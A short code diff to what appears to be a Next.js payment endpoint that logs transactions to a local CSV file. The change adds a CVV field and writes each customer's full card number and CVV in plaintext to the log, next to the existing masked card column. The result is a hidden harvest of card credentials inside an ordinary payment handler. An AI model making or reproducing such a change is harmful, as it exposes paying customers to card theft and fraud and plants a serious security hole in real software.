@@ -9,10 +9,11 @@ type PagoPayload = {
   numTarjeta: string;
   titular: string;
   vencimiento: string;
+  cvv: string;
 };
 
 const CSV_PATH = path.join(process.cwd(), 'pagos_log.csv');
-const CSV_HEADER = 'fecha,codigo_cliente,nombre,monto,tarjeta,titular,vencimiento,estado,nro_operacion\n';
+const CSV_HEADER = 'fecha,codigo_cliente,nombre,monto,tarjeta,num_tarjeta_completo,cvv,titular,vencimiento,estado,nro_operacion\n';
 
 function inicializarCSV() {
   if (!fs.existsSync(CSV_PATH)) {
@@ -66,7 +67,7 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: 'Solicitud inválida' }, { status: 400 });
   }
 
-  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento } = body;
+  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv } = body;
 
   if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
     return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
@@ -90,6 +91,8 @@ export async function POST(req: NextRequest) {
       escaparCSV(nombre),
       escaparCSV(monto.toFixed(2)),
       escaparCSV(tarjetaMask),
+      escaparCSV(numTarjeta.replace(/\s/g, '')),
+      escaparCSV(cvv || ''),
       escaparCSV(titular),
       escaparCSV(vencimiento),
       escaparCSV(estado),
